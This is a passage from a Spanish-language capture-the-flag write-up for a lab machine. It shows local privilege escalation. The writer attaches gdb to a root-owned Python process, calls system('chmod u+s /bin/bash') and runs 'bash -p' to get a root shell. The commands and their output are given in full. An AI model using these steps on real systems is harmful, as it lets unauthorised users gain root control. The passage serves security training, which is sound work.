root         724  0.0  0.8  26896 17880 ?        Ss   Aug05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers <-------- Interesting
root         729  0.0  0.4 236436  8988 ?        Ssl  Aug05   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         740  0.0  0.3  17472  7152 ?        Ss   Aug05   0:01 /lib/systemd/systemd-logind
root         741  0.0  0.6 395512 13696 ?        Ssl  Aug05   0:00 /usr/lib/udisks2/udisksd
root         785  0.0  0.6 318816 13520 ?        Ssl  Aug05   0:00 /usr/sbin/ModemManager
root         912  0.0  0.1   5568  2964 ?        Ss   Aug05   0:00 /usr/sbin/cron -f
root         913  0.0  0.8 194680 16848 ?        Ss   Aug05   0:04 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         920  0.0  0.1   7248  3172 ?        S    Aug05   0:00 /usr/sbin/CRON -f
root         925  0.0  0.0  55276  1540 ?        Ss   Aug05   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         927  0.0  0.0   2608   528 ?        Ss   Aug05   0:00 /bin/sh -c bash /root/service_check.sh           
root         929  0.0  0.1   5648  2944 ?        S    Aug05   0:06 bash /root/service_check.sh

...

```

> Luego nos enlazamos con `gdb` y el respectivo **PID** del proceso

```console
developer@faculty:~$ gdb -p 724                                                
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2                                             
Copyright (C) 2020 Free Software Foundation, Inc.                  
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.                    
There is NO WARRANTY, to the extent permitted by law.                                 
Type "show copying" and "show warranty" for details.                                                                                                                        
This GDB was configured as "x86_64-linux-gnu".                                        
Type "show configuration" for configuration details.                                                                                                                        
For bug reporting instructions, please see:                     
<http://www.gnu.org/software/gdb/bugs/>.                                                                                                                                    
Find the GDB manual and other documentation resources online at:                                                                                                            
    <http://www.gnu.org/software/gdb/documentation/>.                                                                                                                       
                                                                                                                                                                            
For help, type "help".                                                                                                                                                      
Type "apropos word" to search for commands related to "word".         
Attaching to process 724                                                              
Reading symbols from /usr/bin/python3.8...                                                                                                                                  
(No debugging symbols found in /usr/bin/python3.8)                                                                                                                          
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...                       
--Type <RET> for more, q to quit, c to continue without paging--                                                                                                            
Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...

...

Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007f60d12c3967 in __GI___poll (fds=0xbd2a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb)
```

Al ejecutar observamos que se leen diversas librerias de los programas que forman parte en el proceso. Entonces usando el comando `info function <reg_expresion>` podemos buscar las funciones disponibles del programa en cuestión:

> Buscamos funciones con la expresion **system** con el propósito de poder ejecutar comandos

```console
(gdb) info function system
All functions matching regular expression "system":

File ../sysdeps/posix/system.c: <------------------------- C file!
197:    int __libc_system(const char *);
102:    static int do_system(const char *);

File pt-system.c:
38:     static int system_compat(const char *);

File svc.c:
309:    void __GI_svcerr_systemerr(SVCXPRT *);

Non-debugging symbols:
0x0000000000425530  system@plt
0x00007f60d0a42180  g_mem_is_system_malloc
0x00007f60d0a73d60  g_get_system_data_dirs

...

```

Buscando el archivo con su ruta relativa, encontramos que es una librería estándar de C que nos permite **ejecutar subprocesos o comandos en el Sistema Operativo**. Además pertenece a **Glibc** que es una **librería central del sistema** en C y es esencial en la mayoría de programas

> Entonces llamamos a la función **system** con el comando `call system("<command>")`

```console
(gdb) call system("chmod u+s /bin/bash")
[Detaching after vfork from child process 42640]
$4 = 0      <--------- successful process
(gdb) call system("wrong command")
[Detaching after vfork from child process 42653]
$5 = 32512  <--------- unsuccessful process
```

Solo asignamos a la `bash` permisos **SUID** para poder ejecutarlo como el propietario (root)

> Por último usamos el comando `shell` para obtener una consola, usamos `bash -p` para ejecutar la bash como el propietario y ser **root**

```console
(gdb) shell
bash-5.0$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bash
bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Aug  5 06:54 /root/root.txt
```
